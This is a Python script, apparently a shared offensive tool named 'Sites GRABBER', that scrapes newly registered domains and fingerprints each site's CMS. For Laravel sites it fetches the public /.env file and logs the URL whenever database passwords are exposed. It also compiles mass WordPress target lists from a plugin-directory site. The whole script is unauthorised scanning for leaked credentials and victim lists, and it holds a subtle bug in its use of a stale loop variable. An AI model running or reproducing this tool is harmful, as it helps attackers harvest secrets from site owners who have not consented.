import sys
import time
import requests
import re
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, wait


#__author__      = "Jevil36239"
#__github__      = "github.com/Jevil36239"
#__Finished__    = "12 - June - 2023"
#__name__        = "Sites GRABBER"

RESET = "\033[0m"
RED = "\033[31m"
BLUE = "\033[34m"
YELLOW = "\033[33m"

months = ['jan', 'feb', 'mar', 'apr', 'may', 'jun', 'jul', 'aug', 'sep', 'oct', 'nov', 'dec']

banner = """
/_ Zeru Projects ___       /
                   Sites GRABBER_#

"""

for i in banner:
    color = RED if i == '-' or i.isupper() else BLUE if i == '(' or i == ')' else YELLOW if i == '<' or i == '>' else ""
    sys.stdout.write(color + i + RESET if color else i)
    sys.stdout.flush()
    time.sleep(0.001)


def check_cms(domain):
    try:
        site = requests.get(f"http://{domain}", timeout=3)
        if 'laravel' in site.text:
            print(f"LARAVEL     | {domain}")
            validate_laravel_env(f"http://{domain}/.env")
        elif 'wp-content' in site.text:
            print(f"WORDPRESS   | {domain}")
            with open("WORDPRESS.txt", "a") as file:
                file.write(f"{domain}\n")
            plugin_urls = scrape_plugin_names('https://pluginu.com/')
            if plugin_urls:
                scrape_sites_sequential(plugin_urls, domain)
        else:
            print(f"OTHER       | {domain}")
            with open("OTHER.txt", "a") as file:
                file.write(f"{domain}\n")
    except requests.RequestException as e:
        print(f"ERROR       | {domain}")


def validate_laravel_env(dotenv_url):
    try:
        dotenv_site = requests.get(dotenv_url, timeout=3)
        if 'DB_PASSWORD' in dotenv_site.text:
            print(f"LARAVEL     | {dotenv_url}")
            with open("LARAVEL.txt", "a") as file:
                file.write(f"{dotenv_url}\n")
    except requests.RequestException as e:
        print(f"ERROR       | {dotenv_url}")


def get_dates():
    try:
        header = {
            'User-agent': 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 '
                          '(KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
        resp = requests.get('https://www.cubdomain.com/domains-registered-dates/1', headers=header).text
        pages = re.findall('">(.*?)</a>\n</div>\n<div class', resp)
        for data in pages:
            if '/' in data or '=' in data or 'Download Extension' in data:
                continue
            date = re.findall('(\d{1,2}) ([A-Za-z]+) (\d{4})', data)[0]
            month = str(date[1]).lower()[:3]
            date_str = f"{date[2]}-{months.index(month) + 1:02}-{date[0]:02}"
            print(date_str)
            domains = grab_sites(date_str)
            with ThreadPoolExecutor(max_workers=10) as executor:
                future_to_domain = {executor.submit(check_cms, domain): domain for domain in domains}
                wait(future_to_domain.keys())
                plugin_urls = scrape_plugin_names('https://pluginu.com/')
                if plugin_urls:
                    scrape_sites_sequential(plugin_urls, domain)
                time.sleep(7)
    except Exception as e:
        print(f"An error occurred while fetching dates: {e}")


def grab_sites(date):
    domains = []
    try:
        headr = {'User-agent': 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 '
                 '(KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30'}
        response = requests.get(f'https://www.cubdomain.com/domains-registered-by-date/{date}/1', headers=headr).text
        page = re.findall('">(.*?)</a>\n</div>', response)
        domains = [dom for dom in page if '/' not in dom and '=' not in dom and 'Download Extension' not in dom]
        print(f"GRABBED     | {domains}")
    except Exception as e:
        print(f"An error occurred while grabbing domains: {e}")
    return domains


def scrape_plugin_names(url):
    try:
        headers = {"User-agent": "Mozilla 5.0 Linux"}
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        plugin_divs = soup.find_all('div', {'class': 'theme-name'})
        return {div.find('a').get('href').replace('/', '') for div in plugin_divs}
    except Exception as err:
        print(f"[-] {err}")
        return None


def scrape_sites_sequential(plugins, domain):
    tasks = []
    for plugin in plugins:
        print(f"BEGIN SCRAPING WORDPRESS | {plugin}")
        max_page = 1000
        time.sleep(5)
        for page_num in range(1, max_page + 1):
            tasks.append((plugin, page_num))
            if len(tasks) >= 10:
                scrape_sites(tasks, domain)
                tasks = []

    if tasks:
        scrape_sites(tasks, domain)


def scrape_sites(tasks, domain):
    for task in tasks:
        plugin, page_num = task
        headers = {"User-agent": "Mozilla 5.0 Linux"}
        try:
            url = f"https://pluginu.com/{plugin}/{page_num}"
            response = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            site_list = soup.find_all('p', {'style': 'margin-bottom: 20px'})
            if not site_list:
                break
            for site in site_list:
                print(f"WORDPRESS   | {site.text} (Page {page_num})")
                with open("WORDPRESS.txt", "a") as file:
                    file.write(f"{site.text}\n")
            time.sleep(7)
        except Exception as err:
            print(f"[-] {err}")


get_dates()
